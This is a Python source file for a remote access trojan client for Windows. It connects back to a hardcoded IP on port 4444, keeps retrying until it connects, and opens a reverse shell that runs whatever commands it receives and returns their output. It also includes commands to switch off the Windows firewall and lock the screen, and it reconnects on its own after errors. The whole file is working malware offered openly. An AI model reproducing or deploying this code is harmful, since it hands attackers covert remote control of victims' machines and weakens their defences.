import time
import socket
from encodings import utf_8
import os
import subprocess
import ctypes

class Connection:
    """
    Opens a socket connection between server and client
    """

    def __init__(self, host: str, port: int) -> None:
        """
        Constructor

        :param host: IP of server
        :param port: Port of server
        """

        self.host = host
        self.port = port

        # Selects family IPv4 to connect to with TCP
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self) -> socket:
        """
        Creates socket connection between client and server
        """

        # Creates tuple with address and port
        server_address = (self.host, self.port)

        while 1:  # Try until it connects
            try:
                # Connect to host
                self.sock.connect(server_address)
                break
            except socket.error:
                # Wait 5 seconds and retry
                time.sleep(5)

        # Connection successful
        self.sock.send(str.encode("Successfully connected\n"))

        return self.sock

class Shell:
    """
    Gets a simple reverse shell back to host
    """

    def __init__(self, sock: socket) -> None:
        """
        Constructor

        :param sock: The socket to send the data through
        """
        self.sock = sock

    def get_shell(self) -> None:
        """
        Executes received commands from the server and sends the output back through the socket
        """

        while 1:  # Infinite loop
            try:
                # Gets cwd and sends to server
                self.sock.send(str.encode(os.getcwd() + "# "))

                # Receives messages from server
                data = self.sock.recv(1024).decode("UTF-8")
                data = data.strip('\n')

                # Special cases
                
                # Exits shell
                if data == "quit" or data == "exit":  
                    break
                
                # Changes directory
                if data[:2] == "cd":  
                    os.chdir(data[3:])

                # Lists cwd with ls
                if data == "ls":  
                    data = "dir"
                
                # Disables/enables firewall
                if data == "firewall off":
                    data = "netsh advfirewall set currentprofile state off"
                if data == "firewall on":
                    data = "netsh advfirewall set currentprofile state on"
                    
                if data == "lock":
                    ctypes.windll.user32.LockWorkStation()
                    data = "echo Screen locked"
                
                if len(data) > 0:
                    # Executes arbitrary command
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    output_str = str(stdout_value, "UTF-8")

                    # Sends output back to server
                    self.sock.send(str.encode("\n" + output_str))

            except socket.error:
                continue

class Client:
    """
    Performs all necessary actions for the RAT to function:
        - Creates socket
        - Gets a reverse shell back to the server
    """

    def __init__(self, host: str, port: int) -> None:
        """
        Constructor

        :param host: The server's IP
        :param port: The server's port number
        """
        self.host = host
        self.port = port

    def hack(self) -> None:
        """
        Creates a connection between server and client.
        Gets a reverse shell from client to server
        """

        # Create client instance
        client = Connection(self.host, self.port)

        # Open socket connection back to server
        sock = client.connect()

        # Create shell instance
        shell = Shell(sock)

        # Get a reverse shell back to server
        try:
            shell.get_shell()
        except socket.error:
            time.sleep(5)  # Wait 5s
            sock.close()  # Close erroneous connection
            self.hack()  # Retry

        # Close connection when finished
        sock.close()


if __name__ == "__main__":
    # Run RAT with specified IP and port
    Client("192.168.178.70", 4444).hack()
